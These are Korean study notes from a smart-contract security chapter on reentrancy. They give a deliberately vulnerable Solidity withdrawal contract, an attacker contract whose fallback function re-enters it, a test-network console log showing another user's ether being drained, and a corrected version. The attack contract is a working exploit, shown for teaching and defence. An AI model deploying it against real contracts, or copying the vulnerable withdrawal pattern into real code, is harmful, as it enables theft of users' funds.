# 스마트 계약의 취약점과 공격 원리
> 이번 장에서는 스마트 계약에서 발생할 수 있는 대표적인 취약점을 설명하고, 예제와 함께 취약점의 구조 및 공격 원리, 또 이에 대한 대응책을 알아본다.

### 11.1 재진입성 문제
> 재진입성이란 함수가 여러 곳에서 동시에 호출되어도 문제가 발생하지 않는 함수의 성질을 말한다. 
> 재진입성을 만족하지 않는 함수를 편의상 재진입성 문제라고 부른다.

* 잔액 전액 인출 과정
  * 잔액 확인
  * 잔액 전액 인출 (호출한 쪽으로 송금됨)
  * 잔액을 0으로 설정
  
> 2번 과정에서 재진입성 문제가 발생할 가능성이 있다.
> 2번에서 송금을 받을 대상이 계약(Contract)인 경우, 대상 계약이 Fallback 함수를 악용하면 이 송금을 트리거 삼아 다시 호출(재귀) 하여 잔액을 확인하기 전에 모두 재차 송금 가능

> 206p 그림 11-1 을 참조하라.

### 공격 대상 계약
> VictimBalance.sol

```c
pragma solidity ^0.4.11;
contract  VictimBalance {
	// 어드레스 별로 잔고를 관리
	mapping (address => uint) public userBalances;

	// 메시지를 출력하기 위한 이벤트
	event MessageLog(string);
	
	// 잔고를 출력하기 위한 이벤트
	event BalanceLog(uint);

	/// 생성자
	constructor() public{
	}

	/// 송금받을 때 호출되는 함수
	function addToBalance() public payable {
		userBalances[msg.sender] += msg.value;
	}

	/// 이더를 인출할 때 호출되는 함수
	function withdrawBalance() public payable returns(bool) {
		emit MessageLog("withdrawBalance started.");
		emit BalanceLog(address(this).balance);
		
		// 1 잔고를 확인
		if(userBalances[msg.sender] == 0) {
			emit MessageLog("No Balance.");
			return false;
		}
		
		// 2 자신을 호출한 어드레스로 이더 반환
		if (!(msg.sender.call.value(userBalances[msg.sender])())) { revert(); }
		
		// 3 잔고 업데이트
		userBalances[msg.sender] = 0;
		
		emit MessageLog("withdrawBalance finished.");
		
		return true;
	}
}
```

### 공격 계약
> EvilReceiver.sol

```
pragma solidity ^0.4.11;
contract  EvilReceiver {
	
	// 공격 대상 컨트랙트의 어드레스
	address public target;

	// 메시지 출력용 이벤트
	event MessageLog(string);
	
	// 잔고 확인용 이벤트
	event BalanceLog(uint);

	/// 생성자
	constructor(address _target) public{
		target = _target;
	}
	
	/// Fallback 함수
	function() payable public{
		emit BalanceLog(address(this).balance);
		
		// VictimBalance의 withdrawBalance를 호출
		if(!msg.sender.call.value(0)(bytes4(keccak256("withdrawBalance()")))) {
			emit MessageLog("FAIL");
		} else {
			emit MessageLog("SUCCESS");
		} 
	}

	/// EOA로부터 송금받을때 사용하는 함수
	function addBalance() public payable {
	}

	/// 공격대상으로 송금할때 사용하는 함수
	function sendEthToTarget() public {
		if(!target.call.value(1 ether)(bytes4(keccak256("addToBalance()")))) {revert();} 
	}

	/// 공격대상에서 인출할때 사용하는 함수
	function withdraw() public {
		if(!target.call.value(0)(bytes4(keccak256("withdrawBalance()")))) {revert();} 
	}
}
```

### 전체 흐름
> 212p 그림 11-2 참조

* 각 어드레스의 역할
  * eth.accounts[0] : VictimBalance의 소유자이며, 계약을 생성한 계정
  * eth.accounts[1] : VictimBalance에 송금했던 정상 사용자의 계정
  * eth.accounts[2] : VictimBalance를 공격하는 계정. EvilReceiver의 소유자이며, 계약을 생성한 계정
  
* Script
  * VictimBalance 생성하기 : vb
  * EvilReceiver 생성하기 : er
  
  
```
정상적인 사용자가 VictimBalance에 송금 : eth.accounts[1] -> vb 송금
> vb.addToBalance.sendTransaction({from:eth.accounts[1], value:web3.toWei(2,"ether"), gas:5000000})
"0x186b9a9eb823c2baabca87bf70ab1c2029781faa5147ef00a1e030bbc18ef96b"

vb의 잔액은 2ETH 가 됨
> web3.fromWei(eth.getBalance(vb.address), "ether")
2

vb의 userBalances에서도 eth.accounts[1] 계정의 잔액이 2ETH 임을 알 수 있음
> web3.fromWei(vb.userBalances(eth.accounts[1]), "ether")
2

공격자가 er에 송금
> er.addBalance.sendTransaction({from:eth.accounts[2], value:web3.toWei(1,"ether"), gas: 5000000})
"0x007f2fec42a24d17c0f78746346b20201ba2481c91c25a6575942400ea7a42f2"

er의 잔액 1ETH 확인
> web3.fromWei(eth.getBalance(er.address), "ether")
1

EvilReceiver 를 거쳐 VictimBalance로 송금
> er.sendEthToTarget.sendTransaction({from:eth.accounts[2], gas:500000})
"0x21bb78f7cf2cc5063502bbdbcec6f93e3de96463f789c6f205786b689ae40d47"

er의 잔액 확인
> web3.fromWei(eth.getBalance(er.address), "ether")
0

vb의 userBalance에 기재된 er의 잔액 확인
> web3.fromWei(vb.userBalances(er.address), "ether")
1

vb의 잔액도 1eth 증가하여 3eth 가됨을 확인
> web3.fromWei(eth.getBalance(vb.address), "ether")
3

공격자가 EvilReceiver 를 통해 VictimBalance의 이더를 인출
> er.withdraw.sendTransaction({from:eth.accounts[2], gas:5000000})
"0x407dee7bac74598ec82032b94bf00900728ff9afdfcceb21e4dd7ab664011de5"

그런데, 1eth만 반환되고 vb에 2eth가 남아야 하는데...!!
남은 잔액이 0eth 이네?

> web3.fromWei(eth.getBalance(vb.address),"ether")
0

er의 잔액은 예상대로 0일 것이고.. (원래 가진게 1eth 였으므로)
> web3.fromWei(vb.userBalances(er.address), "ether")
0

어라? userBalances를 보면 eth.accounts[1]의 잔액이 2eth 인데 vb의 잔액에는 이미 없기 때문에 이를 반환해줄 수 없다.
그럼 eth.accountsp1[계정 몫의 2eh 는 어떻게 된것?
> web3.fromWei(vb.userBalances(eth.accounts[1]), "ether")
2

여기로 갔네...
> web3.fromWei(eth.getBalance(er.address), "ether")
3
```

### 코드 수정하기
> withdrawBalance 함수 수정하기
> 잔액 업데이트를 먼저 한 다음 자신을 호출한 쪽으로 이더를 반환 하도록 순서를 바꿈
> 전액을 업데이트하기 전에 반환할 금액을 amount 변수에 미리 빼놓기

```c
/// 이더를 인출할 때 호출되는 함수
	function withdrawBalance() public payable returns(bool) {
		emit MessageLog("withdrawBalance started.");
		emit BalanceLog(address(this).balance);
		
		// 1 잔고를 확인
		if(userBalances[msg.sender] == 0) {
			emit MessageLog("No Balance.");
			return false;
		}

		// 2 잔고를 업데이트 하기 전에 송금할 금액 계산
		uint amount = userBalances[msg.sender];				

		// 3 잔고 업데이트
		userBalances[msg.sender] = 0;
		
		// 4 자신을 호출한 어드레스로 이더 반환
		if (!(msg.sender.call.value(amount)())) { revert(); }
		
		emit MessageLog("withdrawBalance finished.");
		
		return true;
	}
```

